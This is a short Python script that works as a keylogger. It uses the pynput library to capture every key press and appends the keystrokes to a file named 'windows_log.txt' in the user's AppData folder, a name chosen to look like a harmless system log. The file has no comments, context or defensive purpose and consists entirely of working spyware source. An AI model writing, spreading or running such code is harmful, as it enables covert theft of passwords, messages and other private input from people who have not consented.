from pynput.keyboard import Key, Listener
from os import environ

key_file = environ["appdata"] + "\\windows_log.txt"

def on_press(pressed_key):
    letters = str(pressed_key)
    letters = letters.replace("'", "")
    if pressed_key == Key.space:
        letters = " "
    elif pressed_key == Key.enter:
        letters = "\n"
    elif pressed_key == Key.shift_l or pressed_key == Key.shift_r:
        letters.upper()
    elif pressed_key == Key.backspace:
        letters = "\b"
    
    with open(key_file, "a", encoding="utf-8") as log:
        log.write(letters)


def core_key():
    with Listener(on_press=on_press) as listener:
        listener.join()